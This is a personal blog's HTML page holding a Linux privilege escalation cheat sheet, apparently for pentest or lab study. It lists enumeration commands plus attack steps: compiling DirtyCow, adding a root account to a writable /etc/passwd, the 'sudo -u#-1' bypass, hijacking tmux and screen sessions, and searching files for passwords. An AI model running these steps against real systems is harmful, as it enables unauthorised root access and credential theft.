@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KageHayashi" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Linux Privilege Escalation 
+      
+      
+      |
+    
+     KageHayashi
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/t-apple-touch-icon.png">
+    <link rel="icon" href="/images/takeda_white_small.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Nunito&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Kanit&display=swap" rel="stylesheet">
+
+<div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img id="author_photo" src="/images/light.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">KageHayashi</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/cheatsheets/">
+          <a href="/cheatsheets/">Cheat Sheets</a>
+        </li>
+      
+        <li class="nav-item" data-path="/shells/">
+          <a href="/shells/">Shells</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Linux Privilege Escalation</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-03-05 21:04:27
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="Basic-Manual-Enumeration"><a href="#Basic-Manual-Enumeration" class="headerlink" title="Basic Manual Enumeration"></a>Basic Manual Enumeration</h1><h2 id="Enumerating-Users"><a href="#Enumerating-Users" class="headerlink" title="Enumerating Users"></a>Enumerating Users</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#Info about me</span></span><br><span class="line"><span class="built_in">id</span> || (<span class="built_in">whoami</span> &amp;&amp; <span class="built_in">groups</span>) 2&gt;/dev/null</span><br><span class="line"><span class="comment">#List all users</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">cut</span> -d: -f1</span><br><span class="line"><span class="comment">#List users with console</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep <span class="string">&quot;sh$&quot;</span></span><br><span class="line"><span class="comment">#List superusers</span></span><br><span class="line">awk -F: <span class="string">&#x27;($3 == &quot;0&quot;) &#123;print&#125;&#x27;</span> /etc/passwd</span><br><span class="line"><span class="comment">#Currently logged users</span></span><br><span class="line">w</span><br><span class="line"><span class="comment">#Login history</span></span><br><span class="line">last | <span class="built_in">tail</span></span><br><span class="line"><span class="comment">#Last log of each user</span></span><br><span class="line">lastlog</span><br><span class="line"></span><br><span class="line"><span class="comment">#List all users and their groups</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">cut</span> -d<span class="string">&quot;:&quot;</span> -f1 /etc/passwd 2&gt;/dev/null);<span class="keyword">do</span> <span class="built_in">id</span> <span class="variable">$i</span>;<span class="keyword">done</span> 2&gt;/dev/null | <span class="built_in">sort</span></span><br><span class="line"><span class="comment">#Current user PGP keys</span></span><br><span class="line">gpg --list-keys 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="Check-Password-Policy"><a href="#Check-Password-Policy" class="headerlink" title="Check Password Policy"></a>Check Password Policy</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD&quot;</span> /etc/login.defs</span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumerating-Environment"><a href="#Enumerating-Environment" class="headerlink" title="Enumerating Environment"></a>Enumerating Environment</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/profile</span><br><span class="line"><span class="built_in">cat</span> /etc/bashrc</span><br><span class="line"><span class="built_in">cat</span> ~/.bash_profile</span><br><span class="line"><span class="built_in">cat</span> ~/.bashrc</span><br><span class="line"><span class="built_in">cat</span> ~/.bash_logout</span><br><span class="line"><span class="built_in">env</span></span><br><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Check-Clipboard"><a href="#Check-Clipboard" class="headerlink" title="Check Clipboard"></a>Check Clipboard</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ `<span class="built_in">which</span> xclip 2&gt;/dev/null` ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Clipboard: &quot;</span>`xclip -o -selection clipboard 2&gt;/dev/null`</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Highlighted text: &quot;</span>`xclip -o 2&gt;/dev/null`</span><br><span class="line">  <span class="keyword">elif</span> [ `<span class="built_in">which</span> xsel 2&gt;/dev/null` ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Clipboard: &quot;</span>`xsel -ob 2&gt;/dev/null`</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Highlighted text: &quot;</span>`xsel -o 2&gt;/dev/null`</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">&quot;Not found xsel and xclip&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumerating-Hostname"><a href="#Enumerating-Hostname" class="headerlink" title="Enumerating Hostname"></a>Enumerating Hostname</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumerating-System"><a href="#Enumerating-System" class="headerlink" title="Enumerating System"></a>Enumerating System</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line">(<span class="built_in">cat</span> /proc/version || <span class="built_in">uname</span> -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null <span class="comment"># old, not by default on many systems</span></span><br><span class="line"><span class="built_in">cat</span> /etc/os-release 2&gt;/dev/null <span class="comment"># universal on modern systems</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumerating-Processes-and-Services"><a href="#Enumerating-Processes-and-Services" class="headerlink" title="Enumerating Processes and Services"></a>Enumerating Processes and Services</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># List running processes</span></span><br><span class="line">ps aux --forest  </span><br><span class="line"></span><br><span class="line"><span class="comment"># List network connections</span></span><br><span class="line">netstat -ano</span><br><span class="line">ss -antlp</span><br><span class="line"></span><br><span class="line"><span class="comment"># List packages</span></span><br><span class="line">dpkg -l </span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumerating-Network"><a href="#Enumerating-Network" class="headerlink" title="Enumerating Network"></a>Enumerating Network</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br><span class="line">ifconfig</span><br><span class="line">route <span class="built_in">print</span></span><br><span class="line">netstat -ie</span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumerating-Scheduled-Tasks"><a href="#Enumerating-Scheduled-Tasks" class="headerlink" title="Enumerating Scheduled Tasks"></a>Enumerating Scheduled Tasks</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /etc/cron*</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line">crontab -l</span><br><span class="line"><span class="built_in">ls</span> -al /etc/cron* /etc/at*</span><br><span class="line"><span class="built_in">cat</span> /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2&gt;/dev/null | grep -v <span class="string">&quot;^#&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumerating-Mountables"><a href="#Enumerating-Mountables" class="headerlink" title="Enumerating Mountables"></a>Enumerating Mountables</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/fstab</span><br><span class="line">mount</span><br><span class="line">lsblk</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kernel-Exploits"><a href="#Kernel-Exploits" class="headerlink" title="Kernel Exploits"></a>Kernel Exploits</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">searchsploit &quot;Linux Kernel&quot;</span><br></pre></td></tr></table></figure>
+<p>To extract all kernel exploits on the web:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2&gt;/dev/null | grep <span class="string">&quot;Kernels: &quot;</span> | <span class="built_in">cut</span> -d <span class="string">&quot;:&quot;</span> -f 2 | <span class="built_in">cut</span> -d <span class="string">&quot;&lt;&quot;</span> -f 1 | <span class="built_in">tr</span> -d <span class="string">&quot;,&quot;</span> | <span class="built_in">tr</span> <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;\n&#x27;</span> | grep -v <span class="string">&quot;^\d\.\d$&quot;</span> | <span class="built_in">sort</span> -u -r | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="DirtyCow"><a href="#DirtyCow" class="headerlink" title="DirtyCow"></a>DirtyCow</h2><p>Linux Privilege Escalation - Linux Kernel &lt;&#x3D; 3.19.0-73.8</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># make dirtycow stable</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</span><br><span class="line">https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c</span><br></pre></td></tr></table></figure>
+
+<h1 id="File-Permissions"><a href="#File-Permissions" class="headerlink" title="File Permissions"></a>File Permissions</h1><h2 id="Writable"><a href="#Writable" class="headerlink" title="Writable"></a>Writable</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">find / <span class="string">&#x27;(&#x27;</span> -<span class="built_in">type</span> f -or -<span class="built_in">type</span> d <span class="string">&#x27;)&#x27;</span> <span class="string">&#x27;(&#x27;</span> <span class="string">&#x27;(&#x27;</span> -user <span class="variable">$USER</span> <span class="string">&#x27;)&#x27;</span> -or <span class="string">&#x27;(&#x27;</span> -perm -o=w <span class="string">&#x27;)&#x27;</span> <span class="string">&#x27;)&#x27;</span> 2&gt;/dev/null | grep -v <span class="string">&#x27;/proc/&#x27;</span> | grep -v <span class="variable">$HOME</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> <span class="comment">#Find files owned by the user or writable by anybody</span></span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> `<span class="built_in">groups</span>`; <span class="keyword">do</span> find \( -<span class="built_in">type</span> f -or -<span class="built_in">type</span> d \) -group <span class="variable">$g</span> -perm -g=w 2&gt;/dev/null | grep -v <span class="string">&#x27;/proc/&#x27;</span> | grep -v <span class="variable">$HOME</span>; <span class="keyword">done</span> <span class="comment">#Find files writable by any group of the user</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Writable-etc-passwd"><a href="#Writable-etc-passwd" class="headerlink" title="Writable &#x2F;etc&#x2F;passwd"></a>Writable &#x2F;etc&#x2F;passwd</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 &lt;passwd&gt;</span><br><span class="line">openssl passwd -1 -salt hacker hacker</span><br><span class="line">mkpasswd -m SHA-512 hacker</span><br><span class="line">python2 -c <span class="string">&#x27;import crypt; print crypt.crypt(&quot;hacker&quot;, &quot;$6$salt&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>Eg. <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p>
+<p>OR add one without password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;dummy::0:0::/root:/bin/bash&#x27;</span> &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="SUID-Binaries"><a href="#SUID-Binaries" class="headerlink" title="SUID Binaries"></a>SUID Binaries</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -u=s 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h1 id="SUDO"><a href="#SUDO" class="headerlink" title="SUDO"></a>SUDO</h1><h2 id="Intended-Functionality"><a href="#Intended-Functionality" class="headerlink" title="Intended Functionality"></a>Intended Functionality</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/sudoers</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>After identifying which binaries we can run as SUDO, we can try using <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> to see if we can escalate our privileges</p>
+<h2 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h2><p>Check vulnerable sudo versions</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -V | grep <span class="string">&quot;Sudo ver&quot;</span> | grep <span class="string">&quot;1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="SUDO-v1-28"><a href="#SUDO-v1-28" class="headerlink" title="SUDO &lt; v1.28"></a>SUDO &lt; v1.28</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 /bin/bash</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Automated-Enumeration"><a href="#Automated-Enumeration" class="headerlink" title="Automated Enumeration"></a>Automated Enumeration</h1><h2 id="LinPeas"><a href="#LinPeas" class="headerlink" title="LinPeas"></a>LinPeas</h2><p>A bash script ran on the local machine</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/linpeas.sh">https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/linpeas.sh</a></p>
+<h2 id="Unix-Priv-Esc-Check"><a href="#Unix-Priv-Esc-Check" class="headerlink" title="Unix-Priv-Esc-Check"></a>Unix-Priv-Esc-Check</h2><p>On Kali, the script is located at</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/unix-privesc-check/unix-privesc-check</span><br></pre></td></tr></table></figure>
+
+<p>Standard run:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix-privesc-check standard</span><br></pre></td></tr></table></figure>
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>When privilege esclating via an <code>SUID</code> program to run <code>/bin/bash</code>, remember to use the <code>-p</code> flag. <code>bash</code> will drop all privileges unless <code>-p</code> is specified.</p>
+<h2 id="Open-Shell-Sessions"><a href="#Open-Shell-Sessions" class="headerlink" title="Open Shell Sessions"></a>Open Shell Sessions</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">screen -<span class="built_in">ls</span></span><br><span class="line">screen -dr &lt;session&gt; <span class="comment">#The -d is to detach whoever is attached to it</span></span><br><span class="line">screen -dr 3350.foo <span class="comment">#In the example of the image</span></span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">ls</span></span><br><span class="line">ps aux | grep tmux <span class="comment">#Search for tmux consoles not using default folder for sockets</span></span><br><span class="line">tmux -S /tmp/dev_sess <span class="built_in">ls</span> <span class="comment">#List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess</span></span><br><span class="line"></span><br><span class="line">tmux attach -t myname <span class="comment">#If you write something in this session it will appears in the other opened one</span></span><br><span class="line">tmux attach -d -t myname <span class="comment">#First detach the session from the other console and then access it yourself</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -la /tmp/dev_sess <span class="comment">#Check who can access it</span></span><br><span class="line">rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess <span class="comment">#In this case root and devs can</span></span><br><span class="line"><span class="comment"># If you are root or devs you can access it</span></span><br><span class="line">tmux -S /tmp/dev_sess attach -t 0 <span class="comment">#Attach using a non-default tmux socket</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Getting-Desperate"><a href="#Getting-Desperate" class="headerlink" title="Getting Desperate"></a>Getting Desperate</h1><p>Find any files with “pass” in them</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep --color=auto-R -i <span class="string">&quot;pass&quot;</span> --color=always 2&gt; (grep -v <span class="string">&#x27;Permission denied&#x27;</span> &gt;&amp;2)</span><br><span class="line">grep --color=auto -rnw <span class="string">&#x27;/&#x27;</span> -ie <span class="string">&quot;PASS&quot;</span> --color=always 2&gt; /dev/null</span><br><span class="line">find . -<span class="built_in">type</span> f -<span class="built_in">exec</span> grep -i -I <span class="string">&quot;PASS&quot;</span> &#123;&#125; /dev/null \;</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-03-05 21:04:27
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Basic-Manual-Enumeration"><span class="toc-text">Basic Manual Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerating-Users"><span class="toc-text">Enumerating Users</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Check-Password-Policy"><span class="toc-text">Check Password Policy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerating-Environment"><span class="toc-text">Enumerating Environment</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Check-Clipboard"><span class="toc-text">Check Clipboard</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerating-Hostname"><span class="toc-text">Enumerating Hostname</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerating-System"><span class="toc-text">Enumerating System</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerating-Processes-and-Services"><span class="toc-text">Enumerating Processes and Services</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerating-Network"><span class="toc-text">Enumerating Network</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerating-Scheduled-Tasks"><span class="toc-text">Enumerating Scheduled Tasks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumerating-Mountables"><span class="toc-text">Enumerating Mountables</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kernel-Exploits"><span class="toc-text">Kernel Exploits</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DirtyCow"><span class="toc-text">DirtyCow</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Permissions"><span class="toc-text">File Permissions</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Writable"><span class="toc-text">Writable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writable-etc-passwd"><span class="toc-text">Writable &#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID-Binaries"><span class="toc-text">SUID Binaries</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUDO"><span class="toc-text">SUDO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Intended-Functionality"><span class="toc-text">Intended Functionality</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Version"><span class="toc-text">Version</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUDO-v1-28"><span class="toc-text">SUDO &lt; v1.28</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Automated-Enumeration"><span class="toc-text">Automated Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LinPeas"><span class="toc-text">LinPeas</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unix-Priv-Esc-Check"><span class="toc-text">Unix-Priv-Esc-Check</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Open-Shell-Sessions"><span class="toc-text">Open Shell Sessions</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Getting-Desperate"><span class="toc-text">Getting Desperate</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/kagehayashi">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/kagehayashi">Copyright © 2024 KageHayashi</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        ▰▰▰
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
